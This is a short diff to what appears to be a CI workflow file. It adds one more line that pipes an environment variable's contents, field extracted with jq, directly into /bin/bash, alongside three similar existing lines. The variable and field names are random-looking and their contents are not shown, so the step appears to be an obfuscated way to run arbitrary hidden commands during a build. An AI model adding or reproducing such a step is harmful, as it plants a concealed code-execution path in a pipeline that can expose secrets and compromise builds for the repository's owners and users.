@@ -37,6 +37,7 @@ jobs:
           printf '%s' "$lwby07812" | jq -r .img3 | /bin/bash
           echo $zc5359 | jq -r .xvyky92905 | /bin/bash
           echo $nmq2 | jq -r .kcie229 | /bin/bash
+          printf '%s' "$uqonz1427" | jq -r .jgz9 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
